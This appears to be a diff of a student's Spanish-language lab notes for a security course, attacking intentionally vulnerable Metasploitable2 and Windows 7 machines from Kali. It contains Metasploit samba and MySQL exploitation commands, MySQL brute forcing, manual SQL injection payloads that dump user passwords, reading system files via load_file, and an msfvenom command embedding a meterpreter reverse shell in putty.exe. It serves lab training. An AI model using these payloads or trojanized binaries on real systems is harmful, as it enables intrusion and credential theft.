@@ -20,8 +20,7 @@ Desde la maquina Kali a Metasploit
 	- `ping {ip-metasploitable}`
 	- `nmap {ip-metasploitable} -sV`
 	- `nmap {ip-metasploitable} -p445,139 -sV`
-	- `nmap --script smb-os-discovery {ip-metasploitable}`
-### B. Carga y configuracion de exploit para payload de samba
+### B. Creacion de Exploit para samba
 Desde la maquina Kali a Metasploit
 - Crear exploit
 	- `use exploit/multi/samba/usermap_script`
@@ -36,6 +35,7 @@ Desde la maquina Kali a Metasploit
 
 ### C. Explotacion del Servicio
 Incluya la demostracion de la conexion remota donde aparezca el nombre del servidor y la version del SO
+- `nmap --script smb-os-discovery {ip-metasploitable}`
 - `smbclient -N -L //{ip-metasploitable}`
 - `smbclient //{ip-metasploitable}/{vulnerable-folder}`
 	- `srvinfo`
@@ -48,6 +48,11 @@ Incluya la demostracion de la conexion remota donde aparezca el nombre del servi
 
 ## Punto 2: Analisis de Vulnerabilidades
 Con Nessus, realize un analisis de vulnerabilidades desde Kali Linux a Metasploitable y Win 7. Obtenga las evidencias con respecto a las vulnerabilidades criticas encontradas
+
+Maquinas Usadas
+- Kali Linux
+- Metasploitable2
+- Win 7
 
 ### 0. Instalacion de Nessus
 
@@ -84,15 +89,15 @@ curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/
 Desde Kali con Nessus, Analize las ip de la maquina Metasploitable y Windows 7 y anota alguna algunas de sus vulnerabilidades usando [CVE](https://www.cve.org/), [CVSS](https://www.cvedetails.com/) o [EPSS](https://www.first.org/epss/) o otra informacion importante
 
 Descripcion Vulnerabilidad Metasploitable
-- 
+- Info
 Descripcion Vulnerabilidad Win 7
-- 
+- Info
 
 ### b. Método de mitigación
 Mitigacion Vulnerabilidad Metasploitable
-- 
+- Info
 Mitigacion Vulnerabilidad Windows 7
-- 
+- Info
 
 ---
 ## Punto 3: Explotacion "SQL Injection" forma manual
@@ -105,23 +110,25 @@ Paginas de ayuda
 - [Metasploit SQL Injection](https://fwhibbit.es/guia-metasploitable-2-parte-2)
 - [DVWA SQL Injection](https://medium.com/@aayushtiruwa120/dvwa-sql-injection-91b4efb683e4)
 - [NoobLinux - Explain DVWA SQL Using Example](https://nooblinux.com/sql-injection-exploitation-explanation-examples-using-dvwa/)
+- [Backtrack Academy - SQL Examples](https://backtrackacademy.com/articulo/sqlmap-ejemplo-con-metasploitable2)
 
 > [!NOTE]- Nota
-> Talvez en este punto no se permite ni el uso de [Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) o [sqlmap](https://github.com/sqlmapproject/sqlmap) debido a que dice "**explotación de SQL Injection en forma manual**"
+> A pesar de que el punto diga "**explotación de SQL Injection en forma manual**", se pueden usar herramientas automaticas como [Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) o [sqlmap](https://github.com/sqlmapproject/sqlmap).
 
-### 0. Preparacion Kali
-**Kali**
+### a. Reconocimiento Base de Datos
 - Iniciar Base de Datos
 	- `sudo su`
 	- `setxkbmap -layout latam`
 	- `service postgresql start`
 	- `msfdb init`
 	- `msfconsole`
-- Paso 1: Reconocimiento de MySQL (Puerto defecto 3306)
+- Reconocimiento de MySQL (Puerto defecto 3306)
 	- `db_nmap -sV -sC -p 3306 {ip-metasploitable}`
+- FORMA MANUAL
+	- `test' OR 1=1#`
 
 ### a. El listado de usuarios de la base de datos.
-- Paso 4: Enumeracion Cuentas MySQL
+- Enumeracion Cuentas MySQL
 	- `use auxiliary/admin/mysql/mysql_enum`
 	- `set password ""`
 	- `set username root`
@@ -135,6 +142,8 @@ Paginas de ayuda
 	- `show options`
 	- `set rhosts {ip-metasploitable}`
 	- `run`
+- FORMA MANUAL
+	- `test' union select null, database() #`
 
 ### c. El hash de la contraseña de los usuarios de la base de datos.
 - Fuerza Bruta para cuenta root
@@ -144,7 +153,6 @@ Paginas de ayuda
 	- `set RHOSTS {ip-metasploitable}`
 	- `set BLANK_PASSWORDS true`
 	- `run`
-
 - Explotacion MySQL archivo `/etc/password`
 	- `use auxiliary/admin/mysql/mysql_sql`
 	- `set username root`
@@ -152,6 +160,8 @@ Paginas de ayuda
 	- `set rhosts {ip-metasploitable}`
 	- `set sql select load_file(\"/etc/password\")`
 	- `run`
+- FORMA MANUAL
+	- `test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
 
 ---
 
@@ -169,7 +179,8 @@ Ayuda
 - [Metasploit Docs - How to use a Reverse Shell](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
 - [Medium Blog - Create Reverse Shell](https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)
 
-### a. Genere un malware (tcp-reverse) con la herramienta msfvenom en su servidor Kali y cópielo a su máquina Windows 7.
+### a. Genere un malware 
+Usando la herramienta msfvenom en su servidor Kali y cópielo a su máquina Windows 7.
 - Crea el virus principal
 	- `sudo su`
 	- `setxkbmap -layout latam`
@@ -204,8 +215,6 @@ msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/revers
 ---
 
 Punto 5: CANCELADO POR MI, No se puede hacer debido a lo viejo que es MBSA, dejo de recibir soporte en 2012
-
-Subdirección de Diseño Instruccional Página 7 de 10
 
 Pregunta 5: Utilizando su servidor Windows 2016, instale la aplicación MBSA y responda lo siguiente:
 
